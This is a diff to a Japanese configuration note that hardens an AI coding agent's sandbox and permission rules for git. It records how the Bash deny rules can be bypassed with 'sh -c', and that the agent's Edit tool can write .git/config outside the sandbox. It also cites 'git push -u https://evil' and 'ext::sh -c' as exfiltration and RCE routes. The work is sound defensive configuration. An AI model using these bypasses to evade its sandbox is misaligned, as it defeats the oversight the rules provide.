@@ -31,6 +31,7 @@
 | `D2` | 2026-05-25 | 2.1.150 | Bash matcher はシェルオペレータ（`&&` `;` `\|` 等）と `$(...)` を分解して各部に適用するが、**別パス名（`/bin/echo` 等）・インタプリタ包み（`sh -c` / `bash -c` / `python -c`）は取りこぼす**。`sh -c '<denied>'` 一発で deny を回避できる → Bash deny は「うっかり承認を防ぐ床」であって境界ではない（境界は sandbox） |
 | `D3` | 2026-05-25 | 2.1.150 | **`Write(...)` deny は組み込み Write tool をブロックしない**。Write tool（作成/上書き）は Edit カテゴリで `Edit(...)` のみが縛る。`Write(...)` の実効は Bash redirect 遮断のみ。パス形式（`~/dir/**`/exact/`**/X`）で差は無く `Edit` の有無が全て。live-reload は file tool でも正常。実証: `Write(~/.kube/**)` のみ→作成が通り `Edit(~/.kube/**)` 追加→ブロック |
 | `D4` | 2026-05-25 | 2.1.150 | **`Read(//**/*.pem)`（秘密鍵保護）が公開 CA バンドル（`cert.pem`）まで巻き込み**、sandbox 内で CA を read 遮断する。結果、sandbox 内の `git push`/`curl` 等が CA をロードできず **TLS 確立前に失敗**（`error setting certificate verify locations`）。commit はローカルのみで無傷。対策は「sandbox 内で TLS を通す」節（CA バンドルを `allowRead` 例外＋env で参照）。問題は **Claude Code sandbox 固有**（通常ターミナルでは `Read(...)` deny が効かないので無関係） |
+| `D5` | 2026-06-08 | 2.1.168 | **`.git/config`（完全一致）と `.git/hooks/` は harness 組み込みで sandbox-write-deny**（settings.json 由来でない。worktree 非依存で main repo でも `git config --local` 書き込みが `Operation not permitted`）。`objects`/`refs`/`logs`/`index`/`.git` 直下・`config.xxx` は許可なので **`git commit` は通るが `git push -u`/`--set-upstream`/`push.autoSetupRemote` は落ちる非対称**（tracking を `.git/config` に書くため）。しかも config 書き込み拒否でも **git は exit 0 ＋「branch '...' set up to track」でサイレント失敗** → upstream 永続化されず次の素 `git push` が「no upstream configured」。理由は `.git/config` の `core.sshCommand`/`fsmonitor`/alias/`hooksPath` が RCE 源（`~/.gitconfig` deny と同系統）。対策は §git の `excludedCommands` 行き。**Claude の Edit tool は `.git/config` を書ける**（seatbelt 外・`Edit(.git/config)` deny も無し）＝in-sandbox の `git branch -D` が残す orphan config section の手当てに使える。D4 の TLS 失敗（push が落ちる別原因）とは無関係 |
 
 ## ファイル別の保護方針
 
@@ -86,11 +87,16 @@ read を解放し、write のみ防御する。
 `autoAllowBashIfSandboxed: true`（詳細は公式 sandboxing）:
 
 - sandbox 内コマンドは **auto-allow**（`ask`/prompt 不到達）。`deny` は実行前評価で全経路に効く。`rm`/`rmdir` が `/`・home 直撃時のみ circuit breaker で prompt。
-- → 純粋系コマンド（`dirname`/`basename`/`realpath`/`date` 等）の `allow` 列挙は冗長。`allow` が効くのは sandbox 外実行の `gh *` 系と、Bash 外の `WebFetch` だけ。
+- → 純粋系コマンド（`dirname`/`basename`/`realpath`/`date` 等）の `allow` 列挙は冗長。`allow` が効くのは sandbox 外実行（`excludedCommands`）の `gh *`・`git push -u origin *` 系と、Bash 外の `WebFetch` だけ。
 
 ### git
 
-permission ルールを置かない。read-only git は built-in 認識で allow 不要。write・破壊系は sandbox 内完結で auto-allow（`github.com` は `allowedDomains` 内なので push/fetch も）。`ask` は不到達なので無意味。破壊系は sandbox 境界＋`allowedDomains`（github 限定＝外部流出にならない）を信頼して容認。確実に止めたい操作は `deny` か PreToolUse hook。
+**in-sandbox の git には permission ルールを置かない**（auto-allow なので冗長）。read-only git は built-in 認識で allow 不要。write・破壊系は sandbox 内完結で auto-allow（`github.com` は `allowedDomains` 内なので push/fetch も）。`ask` は不到達なので無意味。破壊系は sandbox 境界＋`allowedDomains`（github 限定＝外部流出にならない）を信頼して容認。確実に止めたい操作は `deny` か PreToolUse hook。
+
+**例外: upstream 設定の push は `excludedCommands` 行き＝§gh と同じ扱い**。`git push -u origin *` / `git push --set-upstream origin *` は sandbox 外実行にする。理由は upstream tracking（`branch.X.remote`/`merge`）の書き込み先 `.git/config` が sandbox-write-deny で、in-sandbox だと **exit 0 のサイレント失敗で upstream が永続化されない**ため（`D5`）。sandbox 外＝permission flow に乗るので、§gh の write 系と同様に **allow が必要**（無いと default mode で `ask` に落ち毎回プロンプト。in-sandbox の auto-allow は効かない）。
+
+- **リモートは `origin` にピン留め必須**: `remote.origin.url` 自体が `.git/config` write 保護下で改竄不能なので origin は信頼できる固定先。`git push -u *`（wildcard リモート）は `git push -u https://evil` や `ext::sh -c '<cmd>'` を通し**任意ホスト流出/ローカル RCE** を開くため禁止。allow も `Bash(git push -u origin *)` / `Bash(git push --set-upstream origin *)` と origin 固定で書く。
+- upstream 設定後の素 `git push` は config 書き込み不要なので sandbox 内で OK（除外不要）。`excludedCommands` 変更は seatbelt プロファイルがセッション開始時に焼かれるため**セッション再起動で反映**。
 
 ### gh
 
